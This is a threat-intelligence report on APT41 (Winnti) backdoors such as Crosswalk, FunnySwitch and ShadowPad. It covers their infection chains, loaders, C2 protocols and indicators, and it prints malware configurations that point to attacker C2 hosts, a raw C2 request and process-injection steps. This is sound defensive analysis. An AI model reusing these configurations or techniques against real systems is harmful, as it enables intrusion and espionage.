# Reference for threat actor for "APT 41"

**Title**: Higaisa or Winnti? APT41 backdoors, old and new

**Source**: https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/

## Content











Higaisa or Winnti? APT41 backdoors, old and new


















































Home
AnalyticsPT ESC Threat IntelligenceHigaisa or Winnti? APT41 backdoors, old and new 









Higaisa or Winnti? APT41 backdoors, old and new


Published on 14 January 2021







The PT Expert Security Center regularly spots emerging threats to information security, including both previously known and newly discovered malware. During such monitoring in May 2020, we detected several samples of new malware that at first glance would seem to belong to the Higaisa group. But detailed analysis pointed to the Winnti group (also known as APT41, per FireEye) of Chinese origin. Subsequent monitoring led us to discover a number of new malware samples used by the group in recent attacks. These include various droppers, loaders, and injectors; Crosswalk, ShadowPad, and PlugX backdoors; and samples of a previously undescribed backdoor that we have dubbed FunnySwitch. We can confidently state that some of these attacks were directed at a number of organizations in Russia and Hong Kong.
In this article, we will share the results of our investigation of these samples and related network infrastructure, as well as overlaps with previously described attacks.
Contents


Higaisa shortcuts

Attribution
Crosswalk



Loaders and injectors

Injectors
Local shellcode loaders

Attack examples

An encrypted resume
I can't breathe
Chat transcript





Attacks on Russian game developers

Unity3D Game Developer from St. Petersburg
HFS with a surprise



A purloined certificate


FunnySwitch

Unpacking

Funny.dll

Transport protocols
Network-level protocol
Application-level protocol
Supported commands
Unused code
FunnySwitch vs. Crosswalk





ShadowPad


PlugX

Paranoid PlugX



Conclusion


PT products detection names

PT Sandbox
PT Network Attack Discovery



Applications

Known names of files from which PL shellcode may be loaded
IOCs
MITRE



1. Higaisa shortcuts
The first attack dates to May 12, 2020. At the core of the attack is an archive named Project link and New copyright policy.rar (75cd8d24030a3160b1f49f1b46257f9d6639433214a10564d432b74cc8c4d020). The archive contains a bait PDF document (Zeplin Copyright Policy.pdf) plus the folder All tort's projects - Web lnks with two shortcuts:

Conversations - iOS - Swipe Icons - Zeplin.lnk
Tokbox icon - Odds and Ends - iOS - Zeplin.lnk

The structure of malicious shortcuts resembles the sample 20200308-sitrep-48-covid-19.pdf.lnk spread by the Higaisa group in March 2020.


Figure 1. Comparing command lines in the covid-19 and Zeplin shortcuts

The mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder. Further actions are performed with the help of an extracted JS script.


Figure 2. Contents of script 34fDFkfSD32.js

But here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\Users\Public\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload. The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php.
The command run by the shortcut also contains the opening of a URL file extracted from the archive. The name of the URL file and the target address depend on which shortcut is opened:

Conversations - iOS - Swipe Icons - Zeplin.url goes to:
https://app.zeplin.io/project/5b5741802f3131c3a63057a4/screen/5b589f697e44cee37e0e61df

Tokbox icon - Odds and Ends - iOS - Zeplin.url goes to:
https://app.zeplin.io/project/5c161c03fde4d550a251e20a/screen/5cef98986801a41be35122bb.


This is the only difference between the two LNK files. In both cases, the target page is hosted on Zeplin, a legitimate service for collaboration between designers and developers, and requires logging in to view.
The payload consists of two files:

svchast.exe
It functions as a simple local shellcode loader. The shellcode read from a fixed path. Before starting, the loader checks the current year: 2018, 2019, 2020, or 2021.


Figure 3. Main function in svchast.exe


3t54dE3r.tmp
The shellcode containing the main payload is the Crosswalk backdoor.


On May 30, 2020, a new malicious archive, CV_Colliers.rar (df999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6d), was detected. It had two shortcuts:

Curriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk
International English Language Testing System certificate.pdf.lnk

Their structure fully matched that of the samples from May 12. In this case, the bait consisted of PDF documents with a CV and IELTS certificate. Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php.
Note that all three intermediate C2 servers are on third-level domains on a free hosting service. When accessed in a browser, each displays a different decoy page:


Figure 4. Page at zeplin.atwebpages_com



Figure 5. Page at goodhk.azurewebsites_net



Figure 6. Page at sixindent.epizy_com

These servers do not play a major role in the functioning of the malware; their precise purpose remains unknown. It may be that the malware authors used this to monitor the success of the initial stages of infection, or else tried to lead security teams "off the scent" by masking the malware as a more minor threat.
1.1 Attribution
These attacks have been studied in detail by Malwarebytes and Zscaler. Based on the similarity of the infection chains, researchers classify them as belonging to the Higaisa group.
However, detailed analysis of the shellcode demonstrates that the samples actually belong to the Crosswalk malware family. Crosswalk appeared no later than 2017 and was mentioned for the first time in a FireEye report on the activities of the APT41 (Winnti) group.


Figure 7. From the FireEye report



Figure 8. Fragment of shellcode from 3t54dE3r.tmp

The network infrastructure of the samples overlaps with previously known APT41 infrastructure: at the IP address of one of the C2 servers, we find an SSL certificate with SHA-1 value of b8cff709950cfa86665363d9553532db9922265c, which is also found at IP address 67.229.97[.]229, referenced in a 2018 CrowdStrike report. Going further, we can find domains from a Kaspersky report written in 2013.


Figure 9. Fragment of network infrastructure

All this leads us to conclude that these LNK file attacks were performed by Winnti (APT41), which "borrowed" this shortcut technique from Higaisa.
1.2 Crosswalk
Crosswalk is a modular backdoor implemented in shellcode. The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode.
The information collected by the module includes:

OS uptime
Network adapter IP addresses
MAC address of one of the adapters
Operating system version and whether it is 32-bit or 64-bit
Username
Computer name
Name of running module
PID
Shellcode version and whether it is 32-bit or 64-bit

(The shellcode supports both 32 and 64 bits.) It has two-part version numbers; we found ones including 1.0, 1.10, 1.21, 1.22, 1.25, and 2.0.
For more detailed analysis of one version of Crosswalk, see the VMware CarbonBlack investigation. Based on version 1.25 (8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996), which was used in the attacks with LNK files, here we will describe the networking aspects of the malware in more detail.
Crosswalk has broad capabilities for connecting to C2 servers. The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key. The data structure is as follows:

Configuration size (4 bytes)
Key (16 bytes)
Encrypted configuration

The configuration, in turn, contains the following fields:

0x0 heartbeat interval (in seconds)
0x4 reconnect interval (in seconds)
0x8 bitmask for days of the week when connections may be made
0xC (inclusive) lower bound for time of day when connections may be made
0x10 (non-inclusive) upper bound for time of day when connections may be made
0x14 proxy port
0x18 proxy type
0x1C proxy host
0x9C proxy username
0x11C proxy password
0x19C number of C2 servers
0x1A0 array of structures of C2 servers

A C2 server structure consists of the following fields:

0x0 connection type
0x4 port
0x8 whether DNS name resolution is necessary (yes/no)
0xC length of hostname
0x10 hostname

Before attempting to connect, the backdoor checks whether the current day of the week and time match those allowed in the configuration. Then, one after the other, it tries combinations of possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers until it connects successfully.
The communication protocol used between the backdoor and C2 server can be separated logically into two levels:

Application-level protocol
Transport-level protocol

On the application level, messages consist of the following fields:

FakeTLS header consisting of 5 bytes:

Entry type and protocol version (3 bytes). For the client these always equal 17 03 01; for the server, they have random values.
Data length, not including header (2 bytes)

Message contents:

Command ID (4 bytes, little-endian)
Command data size (4 bytes, little-endian)
Client ID (36 bytes), generated based on the UUID when the backdoor starts operation
Command data


The first two client–server and server–client messages have command IDs 0x65 and 0x64, respectively. They contain the data that will then be used to generate the client and server session keys. The key generation algorithm is detailed in a Zscaler report. For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key. AES-128 is the encryption algorithm used.
The transport-level protocol depends on the connection type indicated in the configuration. Four protocols are supported:

Standard TCP connection
	Application-level messages are sent unchanged as TCP segments.

Equivalent to HTTP Long Polling
	The client creates two TCP connections. The first will be used to get packets from the server, and the second to send them.
During the first connection, a GET request is sent to the C2 server. The server replies with headers with code 200 and Content-Length: 524288000. The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response.


Figure 10. First HTTP connection with C2

After the correct response headers are received, the malware establishes a second connection to the same port, where a POST request is made. The header dCy is generated by the client based on the UUID and, it would seem, serves as the session ID that links the two connections. After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests.


Figure 11. Second HTTP connection with C2

Duplication of socket with TLS connection
	The client establishes a TCP connection and sends an HTTPS request like the following one:
GET /msdn.cpp HTTP/1.1
Connection: Keep-Alive
User-Agent: WinHTTP/1.1
Content-Length: 4294967295
Host: 149.28.152[.]196
The HTTPS connection is not used again. Subsequent messages are exchanged in the original TCP connection (without TLS encryption). Subsequent communication between the client and server occurs via protocol 1, except for when, at the beginning of the session, the client sends two packets with the FakeTLS header, which starts with the sequence 17 03 01. The first packet always has length 0. The second has length 0x3A, 0x3C, 0x3E, or 0x40 and contains random bytes. We were unable to determine the purpose of these packets.


Figure 12. Additional packets with FakeTLS header


KCP protocol
This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer. The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments.


Figure 13. Crosswalk message with KCP headers (highlighted in yellow)



Note that in the Crosswalk samples we detected, none of the samples used the KCP protocol in practice. But the code contains a full-fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration.
The diversity of protocols and techniques would seem to protect the backdoor from network traffic inspection.
2. Loaders and injectors
Investigation of network infrastructure and monitoring of new Crosswalk samples put us onto the scent of other malicious objects containing Crosswalk shellcode as their payload. We can categorize these objects into two groups: local shellcode loaders and injectors. Some of the samples in both groups are also obfuscated with VMProtect.
2.1 Injectors


Figure 14. Code for injecting shellcode into a running process

The injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it. Depending on the sample, explorer.exe and winlogon.exe are the target processes.
The samples we found contain one of three payloads:

Crosswalk
Metasploit stager
FunnySwitch (discussed later in this report)

Crosswalk and FunnySwitch shellcode is located in the data sections "as-is," while the samples with Metasploit show additional XOR encryption with the key "jj1".
2.2 Local shellcode loaders
The main function of the malware is to extract shellcode and run it in an active process. The malware samples belong to one of two categories, based on the source of shellcode that they use: in the original executable or in an external file in the same directory.
Most of the loaders start by checking the current year, much like the samples from the LNK file attacks.


Figure 15. Code of the loader's main function

After the malware finds the API functions it needs, it decrypts the string Global\0EluZTRM3Kye4Hv65IGfoaX9sSP7VA with the ChaCha20 algorithm. In one older version, to prevent being run twice the loader creates a mutex with the name Global\5hJ4YfUoyHlwVMnS1qZkd2tEmz7GPbB. But in recent samples, the decrypted string is not used in any way. Perhaps part of the code was accidentally deleted during the development process.
Another artifact found in some samples is the unused string CSPELOADKISSYOU. Its purpose remains unclear.


Figure 16. String "CSPELOADKISSYOU" in data section

In the self-contained loaders, the shellcode is located in a PE file overlay. The shellcode is stored in a curious way: data starts from 0x60 bytes of the header, followed by the (encrypted) shellcode. The data length is stored at offset –0x24 from the end of the executable. The header always starts with the PL signature. The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50.


Figure 17. Handling of PL shellcode in the loader body (ChaCha20)

The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption. We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.


Figure 18. Handling of PL shellcode in the loader body (AES-128)

Older loader versions use Cryptography API: Next Generation (BCrypt* functions) in an equivalent way. They use AES-128 in CFB mode as the encryption algorithm.
The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC. The file should contain PL shellcode of the same format as in the self-contained loader. The name depends on the specific sample and is encrypted with the algorithm used in it. It can contain a full file path (although we did not detect any such samples) or a relative path.


Figure 19. Building the file name with PL shellcode

Among all the loaders, we encountered three different shellcode payloads:

Crosswalk
Metasploit stager
Cobalt Strike Beacon

2.3 Attack examples
2.3.1 An encrypted resume
This malicious file is a RAR archive, electronic_resume.pdf.rar (025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596), with two files:


Figure 20. Contents of electronic_resume.pdf.rar

The first file might look like bait, but trying to open it in a PDF viewer gives an error, since it is practically a copy of the latter.
The file Электронный читатель резюме.exe ("Electronic reader resume.exe") is an executable self-contained loader for PL shellcode. It contains Cobalt Strike Beacon as the payload.


Figure 21. Configuration of Cobalt Strike Beacon

The archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar. The same IP address was used as C2 server.
The modification time of the archive files, as well as the date on which the archive was found the server, point to the attack being active in late May or early June. The Russian filenames suggest that the targets were Russian-speaking users.
2.3.2 I can't breathe
The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files. The archive is available on June 1 on the same server at the address hxxp://66.42.48[.]186:65500/video.rar.


Figure 22. Contents of video.rar

The executable files are self-contained loaders of Cobalt Strike Beacon PL shellcode with a similar configuration and the same C2 server.
The bait is notable for the topic: the hackers were attempting to exploit U.S. protests related to the death of George Floyd. The main bait was a video with the name "I can't breathe-America's Black Death protests that the riots continue to escalate and ignite America!.mp4" involving reporting on protests in late May, 2020. Judging by the logo, the source of the video was Australian portal XKb, which releases news materials in Chinese.


Figure 23. Still frame from the bait video

2.3.3 Chat transcript
The archive запись чата.7z ("chat transcript.7z") (e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae) contains three identical executable files with names resembling "запись чата-1.png____________________________________.exe" ("chat transcript-1.png____________________________________.exe") in attacks again targeting Russian-speaking users.


Figure 24. Contents of the archive, the name of which promises a "chat transcript"

The malicious files are self-contained PL shellcode loaders, but the payload here is Crosswalk version 2.0.
Its configuration implies three ways to connect to the C2 server at 149.28.23[.]32:

Transport protocol 3, port 8443
Transport protocol 2, port 80
Transport protocol 1, port 8080



Figure 25. Fragment of the Crosswalk configuration

3. Attacks on Russian game developers
The Winnti group first became famous for its attacks on computer game developers. Such attacks continue today, and Russian companies are also among their targets.
3.1 Unity3D Game Developer from St. Petersburg
The attack is based on the archive Resume.rar (4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6), which contains just one file: CV.chm.
Running the file without security updates installed causes two windows to appear simultaneously: CHM help in HTML Help and a PDF document. They contain the same information: a curriculum vitae for the position of game developer or database manager at a St. Petersburg company.
The CV contains plausible contact information, with a St. Petersburg address, email address ending with "@yandex.ru", and phone number starting with "+7" (Russia's country code). The only obviously fake aspect is the phone number: 123-45-67.


Figure 26. Result of opening the CHM file

The PDF file opens due to the script pass.js, which is contained in the CHM file and referenced in the code of the HTML page.


Figure 27. Reference to pass.js in HTML code

The script uses a technique for running an arbitrary command in a CHM file via an ActiveX object. This unpacks an HTML help file to the folder C:\Users\Public for launching the next stage of the infection: the file resume.exe, which is also embedded inside the CHM file.


Figure 28. Deobfuscated script pass.js

resume.exe is an advanced shellcode injector of which we had encountered only one sample as of the writing of this article. Before it gets down to business, this malware, like many other samples we have seen from Winnti, checks the current year. Current processes are checked and the malware will not run if any of the following are active: ollydbg.exe|ProcessHacker.exe|Fiddler.exe|windbg.exe|tcpview.exe|idaq.exe|idaq64.exe|tcpdump.exe|Wireshark.exe.
On first launch, shellcode will be taken from MyResume.pdf; on subsequent launches, winness.config is the shellcode source.


Figure 29. Main function in resume.exe

MyResume.pdf is unpacked from the CHM file. Data read by resume.exe has been added to the end of the PDF file. If the user opens it directly, a message warns that the document is password-protected.


Figure 30. MyResume.pdf, as viewed in Adobe Acrobat Reader

Compared to the PL shellcode, the data structure is more complex and contains the following:

ROR-13 hash of data starting from byte 0x24 (0x20, 4 bytes)
Nonce for algorithm ChaCha20 (0x24, 12 bytes)
ChaCha20-encrypted text (0x30):

Name of PDF file (+0x0)
Size of PDF file (+0x20)
Size of auxiliary shellcode (+0x24)
Size of main shellcode (+0x28)
Constant 0xE839E900 (+0x2C)
PDF file
Auxiliary shellcode
Main shellcode


On first launch of resume.exe, the encrypted portion of the data is decrypted (the key is hard-coded in the executable) and three sections are extracted (PDF, auxiliary shellcode, and main shellcode). The PDF file is saved with a name resembling _797918755_true.pdf in a temporary folder. It then opens for the user (the second window in the screenshot on Figure 26, next to HTML Help).


Figure 31. resume.exe: actions on first launch

The payload runs in a new process %windir%\System32\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98.
Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe.
For persistence, resume.exe (under the name winness.exe) is copied to the folder %appdata%\Microsoft\AddIns\ and the main shellcode is re-encrypted and saved in the same location, with the name winness.config. To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder. For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread.
When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way.
3.2 HFS with a surprise


Figure 32. HFS server on Winnti infrastructure

On June 23, 2020, while investigating Winnti network infrastructure, we detected an active HttpFileServer on one of the active C2 servers. Four images were there for all to see: an email icon, screenshot from a game with Russian text, screenshot of the site of a game development company, and a screenshot of information about vulnerability CVE-2020-0796 from the Microsoft website.


Figure 33. 13524222881554126454-128.png



Figure 34. EaVpPBNXgAE8s3r.jpg



Figure 35. website_battlestategames.png



Figure 36. windows_update.png

The screenshots related to Battlestate Games, the St. Petersburg-based developer of Escape from Tarkov.
Almost two months later, on August 20, 2020, the file CV.pdf____________________________________________________________.exe (e886caba3fea000a7de8948c4de0f9b5857f0baef6cf905a2c53641dbbc0277c) was uploaded to VirusTotal. This file is a self-contained loader for Cobalt Strike Beacon PL shellcode.
Its C2 server is interesting: update.facebookdocs[.]com.
We discovered that the main domain facebookdocs[.]com hosted a copy of the official site of Battlestate Games: www.battlestategames.com. Via an associated C2 IP address (108.61.214[.]194), we found an equivalent page on the phishing domain www.battllestategames[.]com (note the double "l").


Figure 37. Copy of the official Battlestate Games site

When used as C2 servers, such domains give attackers the ability to mask malicious traffic as legitimate activity within the company.
The combination of these two finds makes us think that we detected traces of preparation for, and subsequent successful implementation of, an attack on Battlestate Games.
Moreover, the match between the job listing for Unity3D developer (as seen in the screenshot from the official site) and contents of the curriculum vitae in the file CV.chm (as described in the previous section), considering how closely they matched in time as well as the company and "applicant" both being located in St. Petersburg, suggests a connection between these attacks. Most likely, the CHM file attack was used at the beginning stage of the breach, although we do not have solid confirmation for this.
Use of typosquatting domains for C2 servers is typical of Winnti and has been described in a Kaspersky report.
Battlestate Games received all of the information uncovered by our investigation into the suspected attack.
4. A purloined certificate
Another favorite Winnti technique is theft of certificates for code signing. Compromised certificates are used to sign malicious files intended for future attacks.
We found one such certificate belonging to Taiwanese company Zealot Digital:
Name:           ZEALOT DIGITAL INTERNATIONAL CORPORATION
Issuer:         GlobalSign CodeSigning CA - SHA256 - G2
Valid From:     07:43 AM 08/20/2015
Valid To:       07:43 AM 09/19/2016
Valid Usage:    Code Signing
Algorithm:      sha256RSA
Thumbprint:     91e256ac753efe79927db468a5fa60cb8a835ba5
Serial Number:  112195a147c06211d2c4b82b627e3d07bf09
The files signed with it were predominantly used in attacks on organizations in Hong Kong. They include Crosswalk and Metasploit injectors, the juicy-potato utility, and samples of FunnySwitch and ShadowPad.
5. FunnySwitch
Among the files signed with the Zealot Digital certificate, we discovered two samples of malware containing a previously unknown backdoor. We have called it FunnySwitch, based on the name of the library and one of the key classes. The backdoor is written in .NET and can send system information as well as run arbitrary JScript code, with support for six different connection types, including the ability to accept incoming connections. One of its distinguishing features is the ability to act as message relay between different copies of the backdoor and a C2 server.
5.1 Unpacking
The attack in question starts with the SFX archive x32.exe (2063fae36db936de23eb728bcf3f8a5572f83645786c2a0a5529c71d8447a9af).


Figure 38. Contents of the archive x32.exe

The archive unpacks three files (1.vbs, n3.exe, and p3.exe) into the folder c:\programdata, after which the extracted VBS script runs both executables.
The files n3.exe and p3.exe are identical and inject shellcode into the process explorer.exe. The only difference between them is the final bytes of the shellcode they inject, which contain the XML configuration. In one case, the proxy server 168.106.1[.]1 is specified there in addition:
<?xml version="1.0" encoding="utf-8"?>
<Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6">
    <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" proxy="http://168.106.1[.]1/" interval="30-60"/>
</Config>
<?xml version="1.0" encoding="utf-8"?>
<Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6">
    <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" interval="30-60"/>
</Config>
A subdomain of kasprsky[.]info, db311secsd.kasprsky[.]info, is the C2 domain. Interestingly, several of its other subdomains are mentioned in an FBI report. It dates to May 21, 2020, and warns of attacks on organizations linked to COVID-19 research.
The job of the shellcode is to launch and execute a method from the .NET assembly located immediately after its code. To do so, it gets a reference to the ICorRuntimeHost interface, which it uses to run CLR and create an AppDomain object. The contents of the assembly are loaded into the newly created domain. Reflection is used to run the static method Funny.Core.Run(xml_config), to which the XML configuration is passed.


Figure 39. Calling a method from the .NET assembly

The assembly is the library Funny.dll with obfuscation by ConfuserEx.
5.2 Funny.dll
The backdoor starts by parsing the configuration. Its root element may contain the following fields:

Debug is the flag for enabling debug logging
Group is an arbitrary string sent together with system information.
Password is the key used to encrypt messages.
ID identifies the relay (if not present in the configuration, the GUID is used instead).
StartTime, EndTime, and WeekDays restrict the times and days when the backdoor may function

The <Config> element may contain an arbitrary number of elements describing various types of connectors:

TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server.
They have two parameters in common: address and port (by default, 38001). TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect.
HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server.
Supported client parameters: url – address to connect to, interval – same as at TcpConnector, proxy and cred – proxy server address and credentials. Server parameters: url – list of prefixes on which it will run and timeout – client timeout.
The standard classes HttpWebRequest and HttpListener from .NET Framework are used for client and server implementations. Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.MachineName + ".local.domain". The client, in turn, ignores certificate validation.

RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe. They take a single parameter, name, which is the name of the connection.

TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients.
For the network connectors to work, the backdoor adds an allow rule to Windows Firewall with the name "Core Networking ― IPv4" for its executable module.


Figure 40. Code for adding Windows Firewall rules

Just like with Crosswalk, there are multiple levels of the protocol: in this case, transport, network, and application.
5.2.1 Transport protocols

TCP
	TCP supports three types of messages: PingMessage (0x1), PongMessage (0x2), and DataMessage (0x3). The first two monitor the connection and are relevant only at the TcpConnector/TcpBindConnector level. DataMessage contains network-level data.
Messages consist of a signature (4 bytes), encrypted header (16 bytes), and optional data.
The signature is three random bytes followed by their sum with modulo 256. Incoming messages with an invalid signature are discarded.
The header contains the data size (4 bytes) and byte indicating the message type (0x1, 0x2, or 0x3).
It is encrypted with AES-256-CBC; the key and IV are taken from the MD5 of the key string. The backdoor uses this encryption method in other cases as well, which is why we refer to it as "standard" in the text that follows. The key string in this case is "tcp_encrypted".


Figure 41. Standard encryption in FunnySwitch


HTTP with long polling
	There are three types of requests: GET "connect", GET "pull", and POST "push". To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.
The cookie name is eight random characters. The value is an encrypted Base64 string containing the session GUID and operation name ("connect"). The string is encrypted in the standard way with the key "http".
The client then constantly sends GET requests with pull operations. In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response. Client–server messages are periodically sent as an array as well, for which a POST request with push operation is used.


Figure 42. FunnySwitch connect and pull requests

The special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.

RPC (Pipe)
	Similar to TCP, except for the absence of connection monitoring.


5.2.2 Network-level protocol


Figure 43. Function for processing incoming network-level communications

All messages at this level are encrypted in the backdoor's standard way, with the key string "commonkey".
Messages are an array of three or four elements:

Message type ("hello_request", "hello_response", "message", "error")
Source serialized array
Destination serialized array
Payload (application-level data)

The MsgPack class is also used for serialization. The Source and Destination arrays contain the IDs of the relays through which the message has already passed and the IDs of the routers through it should be delivered to the recipient.
The bodies of hello_request and hello_response messages contain information about the sender's system. When one of these messages is received, the relay saves data about the sender ID, used connector instance and system data. These message types are used to establish a direct connection between relays.
Messages of the "message" type (ones that are not hello_request, hello_response, or error) can be passed via several relays. If its Destination field contains only the ID of the current instance, it will be handled locally; if not, it will be sent to the next relay in the list. For connecting to the next instance, it uses the connector that was saved when exchanging hello_request and hello_response messages.
The backdoor collects the following system information:

Values of the registry keys ProductName and CSDVersion from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
Whether the OS is 32-bit or 64-bit
List of IP addresses
Computer name
Username and workgroup
Name of running module
PID
MAC addresses of network adapters
Value of the Group attribute in the XML configuration

5.2.3 Application-level protocol
At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration. If no such value exists, the key string is "test". Data is compressed with GZip prior to encryption.
After decryption and decompression, the payload is an array (packed MsgPack) consisting of one or two elements: a string with the name of a command and optional array of bytes (data for the command). These elements, in turn, contain another serialized array, which contains a message string ID (which will be used to send the result of the command) plus the data for the command.
5.2.4 Supported commands




Command
Description




invoke
Run JScript code and get the result. Implementation was separated out into a JSCore .NET assembly, which is dynamically loaded from a Base64 constant defined in the main assembly.


Figure 44. Loading the Funny.Eval class from the JSCore assembly

Code execution is accomplished with classes from the Microsoft.JScript namespace.


Figure 45. Code fragments from the Funny.Eval class



connect
Takes an XML string with connector configuration and creates the corresponding object.


update
Packs a response containing the IDs of relays connected to the current copy, together with their system information.


query
Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes.


remove
Removes the specified connector.


createStream
Creates a message queue with the indicated name. The queue connects with the sender of the createStream command.


closeStream
Deletes the named message queue.


sendStream
Adds a message (byte array) to the queue with the specified name.




The result of execution of each command is returned to the sender via the invoke-response command.
5.2.5 Unused code
By all appearances, the FunnySwitch backdoor is still under development, as shown by the incomplete state of message queue functionality. Besides the commands described here already, the code contains the functions PullStream and SendStream, which are not used anywhere. The first extracts a message from the queue (by queue name), while the second sends its creator an arbitrary set of bytes with the stream-data command.
The code also contains several unused classes: an implementation of the KCP protocol, limited-size queue SizeQueue, and string serializer StreamString.


Figure 46. Fragment of KCP class code

5.2.6 FunnySwitch vs. Crosswalk
Based on investigation of the two backdoors, we believe that they were written by the same developers. Several things point at common authorship:

Use of multiple transport protocols
Support for specifying a proxy server
Identical configuration restrictions on time of day and days of the week
Implementation of the KCP protocol
Implemented (and disabled by default) logging of debug messages and errors



Figure 47. Error logging in Crosswalk



Figure 48. Message logging in FunnySwitch

6. ShadowPad
During the investigation we also discovered two samples containing ShadowPad malware.
The first of these is the SFX archive 20200926___Request for wedding reception.exe (03b7b511716c074e9f6ef37318638337fd7449897be999505d4a3219572829b4).


Figure 49. Contents of the archive 20200926___Request for wedding reception.exe

For bait, it contains a Chinese-language Microsoft Word document with the text of a wedding banquet form.


Figure 50. Bait file wedding.docx

The archive contents are unpacked to the folder c:\programdata, from where (besides the bait file being opened) the payload log.exe is launched.
Both the executable file and the DLL library are obfuscated with VMProtect, but we also found identical unprotected versions (as shown in the following screenshots).
An unpacked legitimate component of Bitdefender (386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd) serves as log.exe. It dynamically loads the library log.dll.


Figure 51. Loading log.dll in log.exe

The library, in turn, when loaded checks for whether the current module contains a certain set of bytes at offset 0x2775. If the loading module meets its expectations, these bytes change to a call instruction for a DLL function. As a result, in log.exe right after log.dll loads, a call is made to the function sub_100010D0. The called function is not explicitly exported.


Figure 52. Check and modification of executable module in log.dll

A similar technique has been previously described by ESET in the context of Winnti attacks on universities in Hong Kong. ShadowPad malware was used as the payload in these attacks.
In our case, the code run afterwards had been obfuscated with a new approach: all functions are split into separate instructions that shuffle between each other. Jumps between instructions occur by means of calls to a special function (rel_jmp), which emulates the jmp command. The offset at which the jump occurs is written immediately after a call instruction (see the following figure).


Figure 53. Structure of obfuscated code

In addition, to obfuscate the control flow in the code, conditional jumps that never run are included as well:
cmp     esp, 3181h
jb      loc_1000BCA9
The obfuscated code is the loader for the subsequent shellcode, which is encrypted in the file log.dll.dat. After decryption, the file is deleted and the shellcode is re-encrypted, saved in the registry, and run. When log.exe is launched subsequently, the shellcode will be loaded from the registry.
The data is stored in a hive with a name resembling the following: (HKLM|HKCU)\Software\Classes\CLSID\{%8.8x-%4.4x-%4.4x-%8.8x%8.8x}, in key %8.8X. The values inserted in the formatting strings are generated based on the TimeDateStamp in the PE header of log.dll, and therefore are always identical for any given library copy. In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9bb3f43475} and EB5D1182, respectively.
The payload is ShadowPad shellcode that has been obfuscated with the same rel_jmp and fake-jb techniques. The following strings are contained in its encrypted configuration:
6/30/2020 1:25:52 PM
ccc
%ProgramData%\
msdn.exe
log.dll
log.dll.dat
WMNetworkSvc
WMNetworkSvc
WMNetworkSvc
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
WMSVC
%ProgramFiles%\Windows Media Player\wmplayer.exe
%windir%\system32\svchost.exe
%windir%\system32\winlogon.exe
%windir%\explorer.exe
TCP://cigy2jft92.kasprsky.info:443
UDP://cigy2jft92.kasprsky.info:53
SOCKS4
SOCKS4
SOCKS5
SOCKS5
